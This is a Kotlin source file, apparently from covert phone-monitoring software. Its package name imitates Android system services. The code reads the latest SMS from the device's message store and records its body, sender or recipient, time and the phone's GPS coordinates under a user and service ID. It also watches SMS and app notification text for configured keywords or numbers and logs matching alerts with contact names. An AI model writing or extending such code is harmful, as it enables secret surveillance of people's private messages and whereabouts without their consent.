package com.android.services.util

import android.annotation.SuppressLint
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.telephony.PhoneNumberUtils
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.db.entities.AppNotifications
import com.android.services.db.entities.SmsLog
import com.android.services.db.entities.TextAlert
import com.android.services.enums.TextAlertCategory
import com.android.services.models.SmsCallAlert
import java.net.URLDecoder
import java.net.URLEncoder

object SmsUtil {

    @SuppressLint("Range")
    fun retrieveAndSaveSms(appContext: Context?): SmsLog {
        val smsLog = SmsLog()
        try {
            val managedCursor: Cursor? = appContext?.contentResolver?.query(
                Uri.parse("content://sms"), arrayOf("_id", "body", "type", "date", "address"),
                null, null, "date DESC limit 1"
            )
            if (managedCursor != null) {
                if (managedCursor.moveToFirst()) {
                    try {
                        val messageId: Int =
                            managedCursor.getInt(managedCursor.getColumnIndex("_id"))
                        if (InjectorUtils.provideSmsLogRepository(appContext)
                                .checkSmsNotAlreadyExists(messageId.toString())
                        ) {
                            var messageBody: String =
                                managedCursor.getString(managedCursor.getColumnIndex("body"))
                            try {
                                messageBody = URLEncoder.encode(messageBody, "utf-8")
                            } catch (e: Exception) {
                                logVerbose("Error Encoding Sms = " + e.message)
                            }
                            var messageType: String = try {
                                managedCursor.getString(managedCursor.getColumnIndexOrThrow("type"))
                            } catch (e: Exception) {
                                ""
                            }
                            messageType = if (messageType.contains("1")) "Inbox" else "Sent"
                            val msgTimeStamp: String =
                                managedCursor.getString(managedCursor.getColumnIndex("date"))
                            val messageNumber: String =
                                managedCursor.getString(managedCursor.getColumnIndex("address"))
                            val smsSender = if (messageType == "Inbox") messageNumber else ""
                            val smsRecipient = if (messageType == "Sent") messageNumber else ""
                            var messageAlreadyExists = false
                            InjectorUtils.provideSmsLogRepository(appContext)
                                .getAllSmsWithMessageBody(messageBody) { smsLogs ->
                                    if (smsLogs.isNotEmpty()) {
                                        smsLogs.forEach { smsLog ->
                                            val smsNumber =
                                                if (AccessibilityUtils.messageType == "Inbox") smsLog.smsSender else smsLog.smsRecipient
                                            if (PhoneNumberUtils.compare(
                                                    smsNumber,
                                                    messageNumber
                                                ) || smsNumber == messageNumber
                                            ) {
                                                logVerbose("${AppConstants.SMS_LOG_TYPE} SmsUtil message already exists $smsLog")
                                                messageAlreadyExists = true
                                                return@forEach
                                            }
                                        }
                                    }
                                }

                            if (!messageAlreadyExists) {
                                smsLog.apply {
                                    smsId = messageId.toString()
                                    smsBody = messageBody
                                    smsType = messageType
                                    address = messageNumber
                                    smsTime = AppUtils.formatDate(msgTimeStamp)
                                    this.smsSender = smsSender
                                    this.smsRecipient = smsRecipient
                                    smsStatus = "1"
                                    locationLongitude = AppConstants.locationLongitude ?: ""
                                    locationLattitude = AppConstants.locationLatitude ?: ""
                                    userId = AppUtils.getUserId()
                                    phoneServiceId = AppUtils.getPhoneServiceId()
                                    date = AppUtils.getDate(msgTimeStamp.toLong())
                                    status = 0
                                }
                                InjectorUtils.provideSmsLogRepository(appContext).insert(smsLog)
                            }
                        }
                    } catch (e: Exception) {
                        logVerbose("${AppConstants.SMS_LOG_TYPE} Error Inserting Observer Sms:- " + e.message)
                    }
                }
                managedCursor.close()
            }
        } catch (e: Exception) {
            logVerbose("${AppConstants.SMS_LOG_TYPE} Error Inserting Observer Sms:- " + e.message)
        }
        return smsLog
    }

    fun runSmsTextAlertTask(
        applicationContext: Context,
        smsLog: SmsLog? = null,
        appNotifications: AppNotifications? = null
    ) {
        val isSmsAlert = appNotifications == null
        if ((isSmsAlert && smsLog != null && smsLog.smsId.isNotEmpty()) || appNotifications != null) {
            // New sms arrived check for the Alert Sms
            val textAlertRepository =
                InjectorUtils.provideTextAlertRepository(applicationContext)
            textAlertRepository.selectTextAlerts { textAlerts ->
                if (textAlerts.isNotEmpty()) {
                    val smsBodyDecode = URLDecoder.decode(smsLog!!.smsBody, "utf-8")
                    smsLog.apply {
                        this.smsBody = smsBodyDecode
                    }
                    val smsAlerts =
                        textAlerts.filter { it.category == TextAlertCategory.sms.toString() }
                    if (smsAlerts.isNotEmpty()) {
                        executeSmsAlertTask(
                            applicationContext,
                            smsAlerts,
                            isSmsAlert = isSmsAlert,
                            smsLog = smsLog,
                            appNotifications = appNotifications
                        )
                    } else {
                        logVerbose("${AppConstants.TEXT_ALERT_TYPE} sms alerts are empty")
                    }
                }
            }
        } else {
            logVerbose("${AppConstants.TEXT_ALERT_TYPE} sms log is empty")
        }
    }

    private fun executeSmsAlertTask(
        applicationContext: Context,
        smsAlerts: List<TextAlert>,
        isSmsAlert: Boolean = true,
        smsLog: SmsLog? = null,
        appNotifications: AppNotifications? = null
    ) {
        smsAlerts.forEach { smsAlert ->
            if (smsAlert.type == "keyword") {
                if (isSmsAlert) {
                    if (smsLog!!.smsBody.lowercase().contains(smsAlert.keyword.lowercase())) {
                        logVerbose("${AppConstants.TEXT_ALERT_TYPE} its an sms alert for keyword ${smsAlert.keyword}")
                        addTextAlertEvent(
                            applicationContext,
                            smsAlert,
                            isSmsAlert = isSmsAlert,
                            smsLog = smsLog,
                            appNotifications = appNotifications
                        )
                    }
                } else if (appNotifications!!.text.lowercase()
                        .contains(smsAlert.keyword.lowercase())
                ) {
                    logVerbose("${AppConstants.TEXT_ALERT_TYPE} its an sms alert for keyword ${smsAlert.keyword}")
                    addTextAlertEvent(
                        applicationContext,
                        smsAlert,
                        isSmsAlert = isSmsAlert,
                        smsLog = smsLog,
                        appNotifications = appNotifications
                    )
                }
            } else if (isSmsAlert && smsAlert.type == "phone") {
                val numberEquals = PhoneNumberUtils.compare(smsLog!!.address, smsAlert.callerId)
                if (numberEquals) {
                    logVerbose("${AppConstants.TEXT_ALERT_TYPE} its an sms alert for phone number ${smsAlert.callerId}")
                    addTextAlertEvent(
                        applicationContext,
                        smsAlert,
                        isSmsAlert = isSmsAlert,
                        smsLog = smsLog,
                        appNotifications = appNotifications
                    )
                }
            }
        }
    }

    private fun addTextAlertEvent(
        applicationContext: Context,
        smsAlert: TextAlert,
        isSmsAlert: Boolean = true,
        smsLog: SmsLog? = null,
        appNotifications: AppNotifications? = null
    ) {
        if (isSmsAlert) {
            val smsCallAlert = SmsCallAlert()
            smsCallAlert.also {
                it.phoneNumber = smsLog!!.address
                it.contactName = AppUtils.getContactName(smsLog.address, applicationContext)
                it.body = smsLog.smsBody
                it.type = smsLog.smsType
                it.date = AppUtils.formatDate(System.currentTimeMillis().toString())
            }
            RoomDBUtils.addTextAlertEvent(applicationContext, smsAlert, smsCallAlert)
        } else {
            val smsCallAlert = SmsCallAlert()
            smsCallAlert.also {
                it.phoneNumber = appNotifications!!.title
                it.contactName = appNotifications.title
                it.body = appNotifications.text
                it.type = "Incoming"
                it.date = AppUtils.formatDate(System.currentTimeMillis().toString())
            }
            RoomDBUtils.addTextAlertEvent(applicationContext, smsAlert, smsCallAlert)
        }
    }
}